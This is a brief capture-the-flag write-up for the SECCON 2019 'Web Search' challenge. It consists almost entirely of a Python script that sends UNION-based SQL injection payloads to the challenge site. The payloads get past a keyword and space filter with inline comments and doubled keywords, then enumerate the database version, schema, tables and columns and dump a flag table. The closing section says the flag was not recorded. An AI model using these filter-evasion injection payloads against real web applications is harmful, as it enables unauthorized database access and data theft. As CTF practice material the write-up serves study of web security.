# SECCON19 Web Search

Get a hidden message! Let's find a hidden message using the search system on the site.

[http://web-search.chal.seccon.jp/](http://web-search.chal.seccon.jp/)

```python
import requests

query = "1' UNION SELECT * FROM (SELECT 10)A JOIN (SELECT @@version)B JOIN (SELECT 10)C#" # 10.4.8-MariaDB-1:10.4.8+maria~bionic
query = "1' UNION SELECT * FROM (SELECT 10)A JOIN (SELECT database())B JOIN (SELECT database())C#" # seccon_sqli
query = "1' UNION SELECT * FROM (select table_name from infoorrmation_schema.tables)A JOIN (SELECT 5)B JOIN (SELECT 5)C#"
#query = "1' UNION SELECT * FROM (select column_name from infoorrmation_schema.columns where table_name = 'articles')A JOIN (SELECT 5)B JOIN (SELECT 5)C#"
#query = "1' UNION SELECT * FROM (select description from articles)A JOIN (SELECT 5)B JOIN (SELECT 5)C#"
#query = "1' UNION SELECT * FROM (select * from flag)A JOIN (SELECT 5)B JOIN (SELECT 5)C#"

query = query.replace(" ", "/**/")
q = {"q": query}
res = requests.get("http://web-search.chal.seccon.jp", params=q)
print(res.text)
```

## Flag

I forgot to write the flag down here.